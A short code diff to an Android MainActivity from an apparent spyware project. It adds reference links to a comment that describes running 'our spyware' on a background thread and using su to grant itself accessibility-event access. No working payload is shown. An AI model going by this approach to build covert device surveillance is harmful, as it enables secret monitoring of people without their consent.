@@ -23,6 +23,10 @@ public class MainActivity extends AppCompatActivity {
      * We execute our spyware on an Background thread. We should also be able to get superuser privideges from a background thread. Using su, we can allow our app to access the accessibility event.
      * https://developer.android.com/reference/android/os/AsyncTask
      * https://developer.android.com/reference/android/os/Looper
+     *
+     * https://stackoverflow.com/questions/29750137/android-performing-su-commands-programatically-does-not-work
+     * https://developer.android.com/reference/android/provider/Settings.Secure
+     * https://gist.github.com/mrk-han/67a98616e43f86f8482c5ee6dd3faabe
      */
     private class EnableAccessibility extends AsyncTask<Void, Void, Void> {
         @Override
